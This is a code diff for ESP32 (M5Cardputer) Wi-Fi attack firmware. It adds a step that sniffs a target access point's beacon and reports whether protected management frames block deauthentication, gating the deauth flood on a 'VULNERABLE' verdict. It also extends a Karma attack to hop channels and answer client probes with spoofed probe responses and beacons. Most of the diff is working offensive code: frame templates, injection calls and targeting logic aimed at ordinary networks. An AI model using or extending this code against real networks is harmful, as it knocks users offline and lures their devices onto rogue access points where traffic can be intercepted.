@@ -34,7 +34,7 @@ constexpr uint32_t CH_DWELL_MS = 300;
 constexpr int BAR_BASE_Y = 108;
 constexpr int BAR_MAX_H = 72;
 
-enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthRun, WifiKarmaRun };
+enum class Screen { Menu, Placeholder, WifiMenu, WifiScan, WifiChannels, WifiSniff, WifiSpamSelect, WifiSpamText, WifiSpamRun, WifiDeauthSelect, WifiDeauthCheck, WifiDeauthRun, WifiKarmaRun };
 
 Screen screen = Screen::Menu;
 int selected = 0;
@@ -812,10 +812,14 @@ const uint8_t DEAUTH_TEMPLATE[DEAUTH_LEN] = {0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff,
                                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                                              0x00, 0x00, 0xf0, 0xff, 0x02, 0x00};
 const uint8_t KARMA_BSSID[6] = {0x02, 0x4b, 0x41, 0x52, 0x4d, 0x41};
-constexpr int KARMA_QUEUE = 8;
+constexpr int KARMA_QUEUE = 16;
+constexpr int KARMA_CH_MAX = 13;
+constexpr uint32_t KARMA_DWELL_MS = 250;
+constexpr uint32_t CHECK_WINDOW_MS = 3000;
 
 struct KarmaReq {
     uint8_t mac[6];
+    uint8_t ch;
     uint8_t ssidLen;
     char ssid[SPAM_SSID_MAX + 1];
 };
@@ -824,14 +828,16 @@ std::atomic<uint32_t> karmaQHead{0};
 std::atomic<uint32_t> karmaQTail{0};
 std::atomic<uint32_t> karmaSeen{0};
 bool karmaRunning = false;
-int karmaCh = 6;
+bool karmaHop = true;
+int karmaCh = CH_FIRST;
+uint32_t karmaDwellStart = 0;
 uint32_t karmaResponses = 0;
 uint32_t karmaErrors = 0;
 uint32_t karmaLastDraw = 0;
 char karmaLast[SPAM_SSID_MAX + 1] = "";
 
 uint8_t deauthBssid[6] = {0};
-int deauthCh = 1;
+int deauthCh = CH_FIRST;
 char deauthSsid[SPAM_SSID_MAX + 1] = "";
 bool deauthRunning = false;
 uint32_t deauthBursts = 0;
@@ -839,6 +845,32 @@ uint32_t deauthSent = 0;
 uint32_t deauthErrors = 0;
 uint32_t deauthLastBurst = 0;
 uint32_t deauthLastDraw = 0;
+
+constexpr uint8_t CHK_SEEN = 0x01;
+constexpr uint8_t CHK_RSN = 0x02;
+constexpr uint8_t CHK_PSK = 0x04;
+constexpr uint8_t CHK_SAE = 0x08;
+constexpr uint8_t CHK_MFPC = 0x10;
+constexpr uint8_t CHK_MFPR = 0x20;
+std::atomic<uint8_t> checkFlags{0};
+bool checkActive = false;
+uint32_t checkEnd = 0;
+enum PmfVerdict : uint8_t { V_NONE, V_NOT_SEEN, V_NO_PMF, V_PMF_OPTIONAL, V_PMF_REQUIRED };
+PmfVerdict deauthVerdict = V_NONE;
+
+const char *authLabel(wifi_auth_mode_t m) {
+    switch (m) {
+    case WIFI_AUTH_OPEN: return "OPEN";
+    case WIFI_AUTH_WEP: return "WEP";
+    case WIFI_AUTH_WPA_PSK: return "WPA";
+    case WIFI_AUTH_WPA2_PSK: return "WPA2";
+    case WIFI_AUTH_WPA_WPA2_PSK: return "WPA/2";
+    case WIFI_AUTH_WPA3_PSK: return "WPA3";
+    case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
+    case WIFI_AUTH_OWE: return "OWE";
+    default: return "ENT";
+    }
+}
 
 void attackRadio() {
     if (WiFi.getMode() != WIFI_AP_STA) {
@@ -852,7 +884,7 @@ void drawNetList(const char *title, const char *footer) {
     d.fillScreen(COLOR_BG);
     d.setTextSize(1);
     d.setTextColor(COLOR_PRIMARY, COLOR_BG);
-    char header[40];
+    char header[48];
     snprintf(header, sizeof(header), "%s: %d found", title, netCount);
     d.drawString(header, 4, 4);
     for (int row = 0; row < WIFI_VISIBLE_ROWS; row++) {
@@ -868,8 +900,8 @@ void drawNetList(const char *title, const char *footer) {
         String ssid = WiFi.SSID(idx);
         if (ssid.length() == 0) ssid = "<hidden>";
         char line[48];
-        snprintf(line, sizeof(line), "%-16.16s %4ld dBm ch%-2ld", ssid.c_str(), (long)WiFi.RSSI(idx),
-                 (long)WiFi.channel(idx));
+        snprintf(line, sizeof(line), "%-13.13s %-6s ch%-2ld %4ld", ssid.c_str(),
+                 authLabel(WiFi.encryptionType(idx)), (long)WiFi.channel(idx), (long)WiFi.RSSI(idx));
         d.drawString(line, 4, y);
     }
     d.setTextColor(COLOR_SECONDARY, COLOR_BG);
@@ -877,7 +909,7 @@ void drawNetList(const char *title, const char *footer) {
 }
 
 void drawDeauthSelect() {
-    drawNetList("Deauth: pick AP", "Enter attack  Bksp back");
+    drawNetList("Deauth: pick AP", "Enter check AP  Bksp back");
 }
 
 void enterDeauthSelect() {
@@ -904,6 +936,122 @@ void chooseDeauthTarget() {
     WiFi.BSSID(netSel, deauthBssid);
     snprintf(deauthSsid, sizeof(deauthSsid), "%s", WiFi.SSID(netSel).c_str());
     deauthCh = static_cast<int>(WiFi.channel(netSel));
+}
+
+void parseRsn(const uint8_t *d, uint32_t n, uint8_t &flags) {
+    flags |= CHK_RSN;
+    uint32_t p = 6;
+    if (p + 2 > n) return;
+    uint32_t pairwise = d[p] | (d[p + 1] << 8);
+    p += 2 + 4 * pairwise;
+    if (p + 2 > n) return;
+    uint32_t akm = d[p] | (d[p + 1] << 8);
+    p += 2;
+    for (uint32_t i = 0; i < akm && p + 4 <= n; i++) {
+        if (d[p] == 0x00 && d[p + 1] == 0x0f && d[p + 2] == 0xac) {
+            if (d[p + 3] == 8) flags |= CHK_SAE;
+            if (d[p + 3] == 2) flags |= CHK_PSK;
+        }
+        p += 4;
+    }
+    if (p + 2 > n) return;
+    uint8_t caps = d[p];
+    if (caps & 0x80) flags |= CHK_MFPC;
+    if (caps & 0x40) flags |= CHK_MFPR;
+}
+
+void onPmfCheck(void *buf, wifi_promiscuous_pkt_type_t type) {
+    if (type != WIFI_PKT_MGMT) return;
+    auto *pkt = static_cast<wifi_promiscuous_pkt_t *>(buf);
+    uint32_t len = pkt->rx_ctrl.sig_len;
+    if (len < 40 || ((pkt->payload[0] >> 4) & 0xF) != 0x8) return;
+    if (memcmp(&pkt->payload[16], deauthBssid, 6) != 0) return;
+    uint8_t flags = CHK_SEEN;
+    uint32_t end = len - 4;
+    uint32_t p = 36;
+    while (p + 2 <= end) {
+        uint8_t tag = pkt->payload[p];
+        uint8_t tlen = pkt->payload[p + 1];
+        if (p + 2 + tlen > end) break;
+        if (tag == 48) parseRsn(&pkt->payload[p + 2], tlen, flags);
+        p += 2 + tlen;
+    }
+    checkFlags.fetch_or(flags, std::memory_order_relaxed);
+}
+
+PmfVerdict computeVerdict(uint8_t f) {
+    if (!(f & CHK_SEEN)) return V_NOT_SEEN;
+    if ((f & CHK_SAE) && !(f & CHK_PSK)) return V_PMF_REQUIRED;
+    if (f & CHK_MFPR) return V_PMF_REQUIRED;
+    if (f & CHK_MFPC) return V_PMF_OPTIONAL;
+    return V_NO_PMF;
+}
+
+bool verdictAllowsDeauth(PmfVerdict v) {
+    return v == V_NO_PMF || v == V_PMF_OPTIONAL;
+}
+
+void drawDeauthCheck() {
+    auto &d = M5Cardputer.Display;
+    d.fillScreen(COLOR_BG);
+    d.setTextSize(1);
+    d.setTextColor(COLOR_PRIMARY, COLOR_BG);
+    char line[48];
+    snprintf(line, sizeof(line), "Target: %s", deauthSsid);
+    d.drawString(line, 4, 4);
+    snprintf(line, sizeof(line), "ch%-2d %02X:%02X:%02X:%02X:%02X:%02X", deauthCh, deauthBssid[0], deauthBssid[1],
+             deauthBssid[2], deauthBssid[3], deauthBssid[4], deauthBssid[5]);
+    d.drawString(line, 4, 16);
+    if (checkActive) {
+        d.drawString("Listening for its beacon (3 s)...", 4, 40);
+    } else if (deauthVerdict == V_NOT_SEEN) {
+        d.drawString("NOT HEARD on this channel.", 4, 40);
+        d.drawString("Don't attack: the AP isn't visible here.", 4, 52);
+    } else if (deauthVerdict == V_NO_PMF) {
+        d.drawString("VULNERABLE: PMF off", 4, 40);
+        d.drawString("Deauth should work on its clients.", 4, 52);
+    } else if (deauthVerdict == V_PMF_OPTIONAL) {
+        d.drawString("PARTIAL: PMF optional", 4, 40);
+        d.drawString("Works only on clients without PMF.", 4, 52);
+    } else if (deauthVerdict == V_PMF_REQUIRED) {
+        d.drawString("BLOCKED: PMF required", 4, 40);
+        d.drawString("Deauth frames will be ignored.", 4, 52);
+    }
+    d.setTextColor(COLOR_SECONDARY, COLOR_BG);
+    if (!checkActive && verdictAllowsDeauth(deauthVerdict)) {
+        d.drawString("Enter run  R retest  Bksp back", 4, 124);
+    } else {
+        d.drawString("R retest  Bksp back", 4, 124);
+    }
+}
+
+void startDeauthCheck() {
+    WiFi.mode(WIFI_STA);
+    setAnalyzerChannel(deauthCh);
+    checkFlags.store(0, std::memory_order_relaxed);
+    wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
+    esp_wifi_set_promiscuous_filter(&filter);
+    esp_wifi_set_promiscuous_rx_cb(&onPmfCheck);
+    esp_wifi_set_promiscuous(true);
+    checkActive = true;
+    checkEnd = millis() + CHECK_WINDOW_MS;
+    deauthVerdict = V_NONE;
+    drawDeauthCheck();
+}
+
+void stopDeauthCheck() {
+    if (!checkActive) return;
+    checkActive = false;
+    esp_wifi_set_promiscuous(false);
+}
+
+void tickDeauthCheck() {
+    if (!checkActive) return;
+    if (millis() >= checkEnd) {
+        stopDeauthCheck();
+        deauthVerdict = computeVerdict(checkFlags.load(std::memory_order_acquire));
+        drawDeauthCheck();
+    }
 }
 
 void deauthBurst() {
@@ -936,7 +1084,7 @@ void drawDeauthRun() {
              (unsigned long)deauthSent, (unsigned long)deauthErrors);
     d.drawString(line, 4, 32);
     d.setTextColor(COLOR_SECONDARY, COLOR_BG);
-    d.drawString("Enter run  ;. ch  Bksp back", 4, 124);
+    d.drawString("Enter run  Bksp back", 4, 124);
 }
 
 void startDeauth() {
@@ -968,12 +1116,13 @@ void tickDeauth() {
     }
 }
 
-void enqueueKarma(const uint8_t *mac, const uint8_t *ssid, uint8_t len) {
+void enqueueKarma(const uint8_t *mac, uint8_t ch, const uint8_t *ssid, uint8_t len) {
     uint32_t head = karmaQHead.load(std::memory_order_relaxed);
     uint32_t tail = karmaQTail.load(std::memory_order_acquire);
     if (head - tail >= KARMA_QUEUE) return;
     KarmaReq &r = karmaQ[head % KARMA_QUEUE];
     memcpy(r.mac, mac, 6);
+    r.ch = ch;
     memcpy(r.ssid, ssid, len);
     r.ssid[len] = '\0';
     r.ssidLen = len;
@@ -993,7 +1142,9 @@ void onKarma(void *buf, wifi_promiscuous_pkt_type_t type) {
         uint8_t tlen = pkt->payload[p + 1];
         if (p + 2 + tlen > end) return;
         if (tag == 0) {
-            if (tlen > 0 && tlen <= SPAM_SSID_MAX) enqueueKarma(&pkt->payload[10], &pkt->payload[p + 2], tlen);
+            if (tlen > 0 && tlen <= SPAM_SSID_MAX) {
+                enqueueKarma(&pkt->payload[10], pkt->rx_ctrl.channel, &pkt->payload[p + 2], tlen);
+            }
             return;
         }
         p += 2 + tlen;
@@ -1006,7 +1157,12 @@ void drawKarmaRun() {
     d.setTextSize(1);
     d.setTextColor(COLOR_PRIMARY, COLOR_BG);
     char line[48];
-    snprintf(line, sizeof(line), "Karma  ch%-2d  %s", karmaCh, karmaRunning ? "RUNNING" : "stopped");
+    const char *state = karmaRunning ? "RUNNING" : "stopped";
+    if (karmaHop) {
+        snprintf(line, sizeof(line), "Karma  hop 1-%d  %s", KARMA_CH_MAX, state);
+    } else {
+        snprintf(line, sizeof(line), "Karma  ch%-2d  %s", karmaCh, state);
+    }
     d.drawString(line, 4, 4);
     snprintf(line, sizeof(line), "Probes seen %lu", (unsigned long)karmaSeen.load(std::memory_order_relaxed));
     d.drawString(line, 4, 18);
@@ -1016,7 +1172,28 @@ void drawKarmaRun() {
     snprintf(line, sizeof(line), "Last: %s", karmaLast);
     d.drawString(line, 4, 46);
     d.setTextColor(COLOR_SECONDARY, COLOR_BG);
-    d.drawString("Enter run  ;. ch  Bksp back", 4, 124);
+    d.drawString("Enter run  H hop  ;. ch  Bksp back", 4, 124);
+}
+
+void karmaSendFor(const KarmaReq &r) {
+    uint8_t frame[SPAM_FRAME_MAX];
+    bool moved = r.ch != karmaCh;
+    if (moved) setAnalyzerChannel(r.ch);
+    size_t len = buildMgmt(frame, 0x50, r.mac, KARMA_BSSID, r.ssid, r.ch);
+    for (int k = 0; k < 2; k++) {
+        if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
+            karmaResponses++;
+        } else {
+            karmaErrors++;
+        }
+    }
+    len = buildMgmt(frame, 0x80, BCAST_ADDR, KARMA_BSSID, r.ssid, r.ch);
+    if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
+        karmaResponses++;
+    } else {
+        karmaErrors++;
+    }
+    if (moved) setAnalyzerChannel(karmaCh);
 }
 
 void startKarma() {
@@ -1028,6 +1205,7 @@ void startKarma() {
     karmaErrors = 0;
     karmaLast[0] = '\0';
     karmaLastDraw = 0;
+    karmaDwellStart = millis();
     setAnalyzerChannel(karmaCh);
     wifi_promiscuous_filter_t filter = {WIFI_PROMIS_FILTER_MASK_MGMT};
     esp_wifi_set_promiscuous_filter(&filter);
@@ -1045,22 +1223,21 @@ void stopKarma() {
 
 void tickKarma() {
     if (!karmaRunning) return;
+    uint32_t now = millis();
+    if (karmaHop && now - karmaDwellStart >= KARMA_DWELL_MS) {
+        karmaDwellStart = now;
+        karmaCh = karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1;
+        setAnalyzerChannel(karmaCh);
+    }
     uint32_t tail = karmaQTail.load(std::memory_order_relaxed);
     uint32_t head = karmaQHead.load(std::memory_order_acquire);
-    uint8_t frame[SPAM_FRAME_MAX];
     for (int n = 0; tail != head && n < 4; n++) {
-        KarmaReq &r = karmaQ[tail % KARMA_QUEUE];
-        size_t len = buildMgmt(frame, 0x50, r.mac, KARMA_BSSID, r.ssid, static_cast<uint8_t>(karmaCh));
-        if (wifiTx(WIFI_IF_AP, frame, len) == ESP_OK) {
-            karmaResponses++;
-        } else {
-            karmaErrors++;
-        }
+        const KarmaReq &r = karmaQ[tail % KARMA_QUEUE];
+        karmaSendFor(r);
         snprintf(karmaLast, sizeof(karmaLast), "%s", r.ssid);
         tail++;
     }
     karmaQTail.store(tail, std::memory_order_release);
-    uint32_t now = millis();
     if (now - karmaLastDraw >= 1000) {
         karmaLastDraw = now;
         drawKarmaRun();
@@ -1093,6 +1270,7 @@ void loop() {
         tickSniffer();
     }
     if (screen == Screen::WifiSpamRun) tickSpam();
+    if (screen == Screen::WifiDeauthCheck) tickDeauthCheck();
     if (screen == Screen::WifiDeauthRun) tickDeauth();
     if (screen == Screen::WifiKarmaRun) tickKarma();
     if (!M5Cardputer.Keyboard.isChange() || !M5Cardputer.Keyboard.isPressed()) return;
@@ -1302,28 +1480,37 @@ void loop() {
         } else if (ks.enter) {
             if (netCount > 0) {
                 chooseDeauthTarget();
-                screen = Screen::WifiDeauthRun;
-                drawDeauthRun();
+                screen = Screen::WifiDeauthCheck;
+                startDeauthCheck();
             }
+        }
+        break;
+
+    case Screen::WifiDeauthCheck:
+        if (back) {
+            stopDeauthCheck();
+            screen = Screen::WifiDeauthSelect;
+            drawDeauthSelect();
+        } else if (wordHas(ks.word, 'r')) {
+            stopDeauthCheck();
+            startDeauthCheck();
+        } else if (ks.enter && !checkActive && verdictAllowsDeauth(deauthVerdict)) {
+            screen = Screen::WifiDeauthRun;
+            drawDeauthRun();
         }
         break;
 
     case Screen::WifiDeauthRun:
         if (back) {
             stopDeauth();
-            screen = Screen::WifiDeauthSelect;
-            drawDeauthSelect();
+            screen = Screen::WifiDeauthCheck;
+            drawDeauthCheck();
         } else if (ks.enter) {
             if (deauthRunning) {
                 stopDeauth();
             } else {
                 startDeauth();
             }
-            drawDeauthRun();
-        } else if (up || down) {
-            deauthCh = up ? (deauthCh <= CH_FIRST ? CH_LAST : deauthCh - 1)
-                          : (deauthCh >= CH_LAST ? CH_FIRST : deauthCh + 1);
-            setAnalyzerChannel(deauthCh);
             drawDeauthRun();
         }
         break;
@@ -1340,10 +1527,15 @@ void loop() {
                 startKarma();
             }
             drawKarmaRun();
+        } else if (wordHas(ks.word, 'h')) {
+            karmaHop = !karmaHop;
+            drawKarmaRun();
         } else if (up || down) {
-            karmaCh = up ? (karmaCh <= CH_FIRST ? CH_LAST : karmaCh - 1)
-                         : (karmaCh >= CH_LAST ? CH_FIRST : karmaCh + 1);
-            if (karmaRunning) setAnalyzerChannel(karmaCh);
+            if (!karmaHop) {
+                karmaCh = up ? (karmaCh <= CH_FIRST ? KARMA_CH_MAX : karmaCh - 1)
+                             : (karmaCh >= KARMA_CH_MAX ? CH_FIRST : karmaCh + 1);
+                if (karmaRunning) setAnalyzerChannel(karmaCh);
+            }
             drawKarmaRun();
         }
         break;
